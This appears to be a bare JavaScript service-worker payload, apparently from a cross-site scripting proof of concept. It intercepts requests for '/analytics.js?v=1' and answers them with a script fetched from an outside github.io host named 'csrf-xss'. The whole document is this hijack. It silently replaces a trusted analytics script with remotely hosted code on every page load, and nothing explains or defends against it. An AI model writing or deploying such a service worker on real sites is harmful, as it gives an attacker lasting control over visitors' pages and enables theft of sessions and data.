self.addEventListener('fetch', event => {
  if (event.request.url.endsWith('/analytics.js?v=1')) {
    event.respondWith(fetch('https://nvj04.github.io/csrf-xss/analytics.js'));
  }
});
